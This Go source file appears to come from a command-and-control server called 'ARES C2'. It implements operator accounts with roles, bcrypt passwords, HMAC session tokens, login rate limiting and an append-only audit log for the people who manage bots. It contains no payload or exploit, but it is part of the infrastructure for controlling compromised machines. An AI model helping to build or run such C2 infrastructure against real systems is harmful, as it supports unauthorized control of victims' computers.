/*
 * ARES C2 — Operator Authentication & Audit Trail (v4.0)
 * Multi-operator with roles + action logging.
 *
 * Roles:
 *   admin    — full access (create operators, build, task, view)
 *   operator — task, view, build
 *   viewer   — view only (bots, results, logs)
 *
 * Auth: HMAC-SHA256 session tokens (no external JWT dependency)
 * Audit: append-only JSON log file
 */

package handler

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/bcrypt"
)

type OperatorRole string

const (
	RoleAdmin    OperatorRole = "admin"
	RoleOperator OperatorRole = "operator"
	RoleViewer   OperatorRole = "viewer"
)

type Operator struct {
	Username  string       `json:"username"`
	PassHash  string       `json:"pass_hash"` // bcrypt hash
	Salt      string       `json:"salt,omitempty"` // legacy, unused with bcrypt
	Role      OperatorRole `json:"role"`
	CreatedAt time.Time    `json:"created_at"`
	LastLogin time.Time    `json:"last_login,omitempty"`
}

type Session struct {
	Token     string
	Username  string
	Role      OperatorRole
	ExpiresAt time.Time
}

type AuditEntry struct {
	Time     string `json:"time"`
	Operator string `json:"operator"`
	Action   string `json:"action"`
	Detail   string `json:"detail,omitempty"`
	IP       string `json:"ip"`
}

type loginAttempt struct {
	count   int
	lastTry time.Time
}

type AuthManager struct {
	operators  map[string]*Operator
	sessions   map[string]*Session
	hmacKey    []byte
	dataDir    string
	auditFile  *os.File
	mu         sync.RWMutex
	loginRates map[string]*loginAttempt
	loginMu    sync.Mutex
}

func NewAuthManager(dataDir string) *AuthManager {
	am := &AuthManager{
		operators:  make(map[string]*Operator),
		sessions:   make(map[string]*Session),
		dataDir:    dataDir,
		loginRates: make(map[string]*loginAttempt),
	}

	// H-8: Persist HMAC key to disk
	hmacKeyPath := filepath.Join(dataDir, ".hmac_key")
	if keyData, err := os.ReadFile(hmacKeyPath); err == nil && len(keyData) >= 32 {
		am.hmacKey = keyData[:32]
		log.Printf("[AUTH] Loaded HMAC key from disk")
	} else {
		am.hmacKey = make([]byte, 32)
		rand.Read(am.hmacKey)
		if err := os.WriteFile(hmacKeyPath, am.hmacKey, 0600); err != nil {
			log.Printf("[AUTH] Warning: cannot persist HMAC key: %v", err)
		}
		log.Printf("[AUTH] Generated and saved new HMAC key")
	}

	// Load operators from disk
	am.loadOperators()

	// C-10: Create default admin if none exist — write password to file, not stdout
	if len(am.operators) == 0 {
		pw := am.generatePassword()
		am.CreateOperator("admin", pw, RoleAdmin)
		pwFile := filepath.Join(dataDir, "admin_password.txt")
		if err := os.WriteFile(pwFile, []byte(pw), 0600); err != nil {
			log.Printf("[AUTH] Warning: cannot write admin password file: %v", err)
		}
		log.Printf("[AUTH] Default admin created — password written to %s", pwFile)
		log.Printf("[AUTH] ⚠ CHANGE THIS PASSWORD IMMEDIATELY")
	}

	// Open audit log
	auditPath := filepath.Join(dataDir, "audit.log")
	f, err := os.OpenFile(auditPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		log.Printf("[AUTH] Warning: cannot open audit log: %v", err)
	}
	am.auditFile = f

	// H-7: Background goroutine to clean up expired sessions every 5 minutes
	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			am.mu.Lock()
			now := time.Now()
			for token, s := range am.sessions {
				if now.After(s.ExpiresAt) {
					delete(am.sessions, token)
				}
			}
			am.mu.Unlock()
		}
	}()

	return am
}

func (am *AuthManager) generatePassword() string {
	b := make([]byte, 12)
	rand.Read(b)
	return hex.EncodeToString(b)[:16]
}

func hashPassword(password string) (string, error) {
	hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return "", err
	}
	return string(hash), nil
}

func verifyPassword(hashedPassword, password string) bool {
	return bcrypt.CompareHashAndPassword([]byte(hashedPassword), []byte(password)) == nil
}

func (am *AuthManager) CreateOperator(username, password string, role OperatorRole) error {
	am.mu.Lock()
	defer am.mu.Unlock()

	hash, err := hashPassword(password)
	if err != nil {
		return fmt.Errorf("failed to hash password: %w", err)
	}

	am.operators[username] = &Operator{
		Username:  username,
		PassHash:  hash,
		Role:      role,
		CreatedAt: time.Now(),
	}
	return am.saveOperators()
}

func (am *AuthManager) Authenticate(username, password string) (*Session, error) {
	am.mu.Lock()
	defer am.mu.Unlock()

	op, ok := am.operators[username]
	if !ok {
		return nil, fmt.Errorf("invalid credentials")
	}

	if !verifyPassword(op.PassHash, password) {
		return nil, fmt.Errorf("invalid credentials")
	}

	// Generate session token
	tokenBytes := make([]byte, 32)
	rand.Read(tokenBytes)
	mac := hmac.New(sha256.New, am.hmacKey)
	mac.Write(tokenBytes)
	token := hex.EncodeToString(mac.Sum(nil))

	session := &Session{
		Token:     token,
		Username:  username,
		Role:      op.Role,
		ExpiresAt: time.Now().Add(12 * time.Hour),
	}
	am.sessions[token] = session
	op.LastLogin = time.Now()

	return session, nil
}

func (am *AuthManager) ValidateSession(token string) (*Session, bool) {
	am.mu.RLock()
	defer am.mu.RUnlock()

	s, ok := am.sessions[token]
	if !ok || time.Now().After(s.ExpiresAt) {
		return nil, false
	}
	return s, true
}

// HasPermission checks if a role can perform an action
func HasPermission(role OperatorRole, action string) bool {
	switch role {
	case RoleAdmin:
		return true // admin can do everything
	case RoleOperator:
		return action != "create_operator" && action != "delete_operator"
	case RoleViewer:
		return action == "view_bots" || action == "view_results" ||
			action == "view_logs" || action == "view_audit"
	}
	return false
}

// AuditLog records an operator action
func (am *AuthManager) AuditLog(operator, action, detail, ip string) {
	entry := AuditEntry{
		Time:     time.Now().UTC().Format("2006-01-02T15:04:05Z"),
		Operator: operator,
		Action:   action,
		Detail:   detail,
		IP:       ip,
	}

	data, _ := json.Marshal(entry)
	if am.auditFile != nil {
		am.auditFile.Write(append(data, '\n'))
	}
	log.Printf("[AUDIT] %s: %s — %s (from %s)", operator, action, detail, ip)
}

// HTTP handler for operator login
func (am *AuthManager) HandleLogin(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid body", 400)
		return
	}

	// C-8: Rate limit login attempts per IP (max 5 per 15 minutes)
	ip := r.RemoteAddr
	am.loginMu.Lock()
	attempt, exists := am.loginRates[ip]
	if !exists {
		attempt = &loginAttempt{}
		am.loginRates[ip] = attempt
	}
	if time.Since(attempt.lastTry) > 15*time.Minute {
		attempt.count = 0
	}
	if attempt.count >= 5 {
		am.loginMu.Unlock()
		am.AuditLog(req.Username, "login_rate_limited", "", ip)
		http.Error(w, "too many login attempts, try again later", http.StatusTooManyRequests)
		return
	}
	attempt.count++
	attempt.lastTry = time.Now()
	am.loginMu.Unlock()

	session, err := am.Authenticate(req.Username, req.Password)
	if err != nil {
		am.AuditLog(req.Username, "login_failed", "", ip)
		http.Error(w, "unauthorized", 401)
		return
	}

	// Reset rate limit on successful login
	am.loginMu.Lock()
	delete(am.loginRates, ip)
	am.loginMu.Unlock()

	am.AuditLog(session.Username, "login", "", ip)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"token":   session.Token,
		"role":    session.Role,
		"expires": session.ExpiresAt,
	})
}

// Middleware that validates session and injects operator context
func (am *AuthManager) AuthMiddleware(next http.HandlerFunc, requiredAction string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		auth := r.Header.Get("Authorization")
		token := strings.TrimPrefix(auth, "Bearer ")

		session, valid := am.ValidateSession(token)
		if !valid {
			http.Error(w, "unauthorized", 401)
			return
		}

		if !HasPermission(session.Role, requiredAction) {
			am.AuditLog(session.Username, "permission_denied", requiredAction, r.RemoteAddr)
			http.Error(w, "forbidden", 403)
			return
		}

		// Inject operator info into request context via headers (simple approach)
		r.Header.Set("X-Operator", session.Username)
		r.Header.Set("X-Role", string(session.Role))
		next(w, r)
	}
}

// Persistence helpers
func (am *AuthManager) loadOperators() {
	data, err := os.ReadFile(filepath.Join(am.dataDir, "operators.json"))
	if err != nil {
		return
	}
	json.Unmarshal(data, &am.operators)
	log.Printf("[AUTH] Loaded %d operators", len(am.operators))
}

func (am *AuthManager) saveOperators() error {
	data, err := json.MarshalIndent(am.operators, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(am.dataDir, "operators.json"), data, 0600)
}

func (am *AuthManager) Close() {
	if am.auditFile != nil {
		am.auditFile.Close()
	}
}

// GetAuditLog returns recent audit entries
func (am *AuthManager) GetAuditLog(limit int) []AuditEntry {
	data, err := os.ReadFile(filepath.Join(am.dataDir, "audit.log"))
	if err != nil {
		return nil
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) > limit {
		lines = lines[len(lines)-limit:]
	}
	entries := make([]AuditEntry, 0, len(lines))
	for _, line := range lines {
		var e AuditEntry
		if json.Unmarshal([]byte(line), &e) == nil {
			entries = append(entries, e)
		}
	}
	return entries
}
